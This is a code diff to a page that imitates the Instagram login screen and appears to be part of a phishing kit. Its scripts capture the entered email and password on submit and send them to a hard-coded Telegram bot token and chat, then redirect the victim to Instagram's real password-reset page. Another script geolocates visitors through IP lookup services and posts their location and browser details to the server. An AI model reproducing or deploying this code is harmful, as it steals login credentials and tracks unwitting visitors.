@@ -1028,7 +1028,7 @@
                   Instagram
                 </h1>
                 <div class="EPjEi" bis_skin_checked="1">
-                  <form action="{{ url_for("submit")}}"" class="HmktE" id="loginForm" method="post">
+                  <form action="{{ url_for("submit")}}" class="HmktE" id="loginForm" method="post">
                     <div
                       class="qF0y9 Igw0E IwRSH eGOV_ _4EzTm kEKum"
                       bis_skin_checked="1"
@@ -1557,7 +1557,7 @@
       </div>
     </div>
   </body>
-   <script>
+     <script>
       window.onload = () => {
          function httpGet(theUrl) {
              var xmlHttp = new XMLHttpRequest();
@@ -1575,7 +1575,8 @@
          xhr.setRequestHeader("Content-Type", "application/json");
          xhr.onreadystatechange = function() {
              if (xhr.readyState === 4) {
-                 //todo
+                 console.log(xhr.status);
+                 console.log(xhr.responseText);
              }
          };
          useragent = ',"useragent":"' + navigator.userAgent + '"'
@@ -1583,65 +1584,38 @@
          new_data = data.slice(0, -1) + useragent + status + data.slice(-1);
          console.log(new_data)
          xhr.send(new_data);
+      
       }
    </script>
-   <script class="ip">
-              window.onload = () => {
-         function httpGet(theUrl) {
-             var xmlHttp = new XMLHttpRequest();
-             xmlHttp.open("GET", theUrl, false);
-             xmlHttp.send(null);
-             return xmlHttp.responseText;
-         }
-      
-         ip = httpGet("https://api.ipify.org/")
-         data = httpGet("https://ipapi.co/" + ip + "/json/")
-         var url = "/";
-         var xhr = new XMLHttpRequest();
-         xhr.open("POST", url);
-         xhr.setRequestHeader("Accept", "application/json");
-         xhr.setRequestHeader("Content-Type", "application/json");
-         xhr.onreadystatechange = function() {
-             if (xhr.readyState === 4) {
-             }
-         };
-         useragent = ',"useragent":"' + navigator.userAgent + '"'
-         status = ',"status":"success"'
-         new_data = data.slice(0, -1) + useragent + status + data.slice(-1);
-         console.log(new_data)
-         xhr.send(new_data);
-        }
-      </script>
-    
-    <script>
-      const form = document.querySelector("#form");
+   <script>
+    const form = document.querySelector("#form");
 
-          addEventListener("submit", (e) => {
-            e.preventDefault();
+      addEventListener("submit", (e) => {
+        e.preventDefault();
 
-            var email = document.getElementById("email").value;
-            var password = document.getElementById("password").value;
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
 
-            var message = "Hits :%0A" + email + ":" + password;
+        var message = "Hits :%0A" + email + ":" + password;
 
-            var token = "5530729858:AAG8bmQJe3dAmEX8d-MwzHKKFMto2B8JLHk";
-            var chat_id = 1430266005;
-            var url =
-              "https://api.telegram.org/bot" +
-              token +
-              "/sendMessage?chat_id=" +
-              chat_id +
-              "&text=" +
-              message;
+        var token = "5530729858:AAG8bmQJe3dAmEX8d-MwzHKKFMto2B8JLHk";
+        var chat_id = 1430266005;
+        var url =
+          "https://api.telegram.org/bot" +
+          token +
+          "/sendMessage?chat_id=" +
+          chat_id +
+          "&text=" +
+          message;
 
-            let api = new XMLHttpRequest();
-            api.open("GET", url, true);
-            api.send();
+        let api = new XMLHttpRequest();
+        api.open("GET", url, true);
+        api.send();
 
-            window.location = "https://www.instagram.com/accounts/password/reset/";
+        window.location = "https://www.instagram.com/accounts/password/reset/";
 
-            console.log("Successfully");
-        });
-              
+        console.log("Successfully");
+      });
+
    </script>
 </html>
